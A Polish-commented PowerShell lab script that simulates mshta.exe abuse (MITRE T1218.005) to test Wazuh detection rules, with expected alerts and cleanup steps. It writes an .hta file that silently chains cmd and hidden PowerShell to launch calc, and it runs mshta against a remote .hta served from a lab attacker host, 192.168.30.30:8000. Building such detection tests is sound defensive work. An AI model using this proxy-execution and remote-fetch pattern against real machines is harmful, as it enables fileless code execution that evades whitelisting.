<#
.SYNOPSIS
    Atak 04 — Wykonanie kodu przez mshta.exe (LOLBAS, T1218.005)

.DESCRIPTION
    Symuluje klasyczne nadużycie mshta.exe — zaufanego binarki
    Microsoft do uruchamiania plików .hta (HTML Application).

    Atakujący używa mshta, bo:
      1. Jest podpisana przez Microsoft → przechodzi domyślne whitelisty
      2. Wykonuje arbitralny VBScript/JScript w pliku .hta
      3. Może pobrać i wykonać kod z URL → "fileless" dropper
      4. Spawn-uje child procesy (powershell, cmd) — to dalej idzie do C2

    Skrypt generuje dwa warianty:
      WARIANT A — lokalny plik .hta z osadzonym VBScriptem
      WARIANT B — zdalny .hta hostowany na atakującym (Kali, 192.168.30.30:8000)

.NOTES
    MITRE ATT&CK:
      - T1218.005 — System Binary Proxy Execution: Mshta
      - T1059     — Command and Scripting Interpreter (dla child)

    Uruchomienie:
      powershell -ExecutionPolicy Bypass -File 04-suspicious-process.ps1
#>

[CmdletBinding()]
param(
    [switch] $SkipLocal,
    [switch] $SkipRemote,
    [string] $AttackerHost = "192.168.30.30",
    [int]    $AttackerPort = 8000
)

$ErrorActionPreference = "Continue"

Write-Host @"

   ╔══════════════════════════════════════════════════════════════╗
   ║   Attack 04 — mshta.exe LOLBAS execution (T1218.005)         ║
   ║   "Trusted binary becomes payload runner"                    ║
   ╚══════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Yellow

# -----------------------------------------------------------------------------
# WARIANT A — lokalny plik .hta
# -----------------------------------------------------------------------------
if (-not $SkipLocal) {
    Write-Host "[*] WARIANT A — lokalny plik C:\Windows\Temp\evil.hta" -ForegroundColor Cyan

    $htaPath = "C:\Windows\Temp\evil.hta"

    # Zawartość .hta — uruchamia PowerShell w ukrytym oknie i odpala calc
    # (calc.exe = uniwersalny "proof of execution" w pentestach)
    $htaContent = @'
<html>
<head>
<title>Important Document</title>
<HTA:APPLICATION ID="evilApp" APPLICATIONNAME="EvilHTA" />
<script language="VBScript">
    Sub Window_OnLoad
        Set wshShell = CreateObject("WScript.Shell")
        ' Klasyczny pattern: mshta → cmd → powershell
        wshShell.Run "cmd.exe /c powershell.exe -NoP -W Hidden -Command ""Write-Host 'PWNED via mshta'; Start-Process calc.exe""", 0, False
        Self.Close
    End Sub
</script>
</head>
<body>
    <h1>Loading document...</h1>
</body>
</html>
'@

    Set-Content -Path $htaPath -Value $htaContent -Encoding ASCII
    Write-Host "    [+] Wygenerowano $htaPath ($((Get-Item $htaPath).Length) B)"

    Write-Host "    [*] Uruchamiam: mshta.exe $htaPath"
    Start-Process -FilePath "mshta.exe" -ArgumentList $htaPath -WindowStyle Hidden
    Start-Sleep -Seconds 3

    # Czy calc się odpalił? Win10 22H2 używa UWP CalculatorApp, starsze — calc.exe / calculator
    $calc = Get-Process -Name 'calc*', 'CalculatorApp' -ErrorAction SilentlyContinue
    if ($calc) {
        Write-Host "    [+] Kalkulator wystartował ($($calc.Name -join ', ')) — PoC działa." -ForegroundColor Green
        Start-Sleep -Seconds 2
        Stop-Process -InputObject $calc -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "    [!] Kalkulator nie wystartował — Defender mógł zablokować lub HTA nie skompilowane."
    }
}

# -----------------------------------------------------------------------------
# WARIANT B — zdalny .hta z Kali
# -----------------------------------------------------------------------------
if (-not $SkipRemote) {
    Write-Host "`n[*] WARIANT B — zdalny plik http://${AttackerHost}:${AttackerPort}/evil.hta" -ForegroundColor Cyan

    # Sprawdź łączność
    $reachable = Test-NetConnection -ComputerName $AttackerHost -Port $AttackerPort `
                                    -InformationLevel Quiet -WarningAction SilentlyContinue

    if (-not $reachable) {
        Write-Host "    [!] $AttackerHost`:$AttackerPort nie odpowiada — pomiń ten wariant" -ForegroundColor Yellow
        Write-Host "    Aby przygotować Kali:" -ForegroundColor Yellow
        Write-Host '      # Na Kali:'
        Write-Host '      cat > /tmp/evil.hta <<EOF'
        Write-Host '      <html><head><script language="VBScript">'
        Write-Host '      CreateObject("WScript.Shell").Run "calc.exe", 0, False'
        Write-Host '      Self.Close'
        Write-Host '      </script></head></html>'
        Write-Host '      EOF'
        Write-Host '      cd /tmp && python3 -m http.server 8000'
    } else {
        Write-Host "    [*] Uruchamiam: mshta.exe http://${AttackerHost}:${AttackerPort}/evil.hta"
        Start-Process -FilePath "mshta.exe" `
                      -ArgumentList "http://${AttackerHost}:${AttackerPort}/evil.hta" `
                      -WindowStyle Hidden
        Start-Sleep -Seconds 3
        Write-Host "    [+] mshta uruchomione." -ForegroundColor Green
    }
}

# -----------------------------------------------------------------------------
# Podsumowanie
# -----------------------------------------------------------------------------
Write-Host "`n[+] Atak zakończony." -ForegroundColor Green
Write-Host ""
Write-Host "Spodziewane alerty w Wazuh:" -ForegroundColor Yellow
Write-Host "    Rule 100220 (level 12): mshta.exe executing remote HTA file"
Write-Host "      → wyzwala WARIANT B (CommandLine zawiera http:// lub https://)"
Write-Host ""
Write-Host "    Rule 100221 (level 13): Suspicious parent-child: mshta spawning interpreter"
Write-Host "      → wyzwala oba warianty (Sysmon EID 1 z ParentImage=mshta.exe"
Write-Host "         AND Image w {powershell, cmd, wscript, cscript})"
Write-Host ""
Write-Host "MITRE: T1218.005 (Mshta) + T1059 (PowerShell/cmd child)"
Write-Host ""
Write-Host "Cleanup:"
Write-Host "    Remove-Item C:\Windows\Temp\evil.hta -Force"
Write-Host "    Get-Process mshta -ErrorAction SilentlyContinue | Stop-Process -Force"
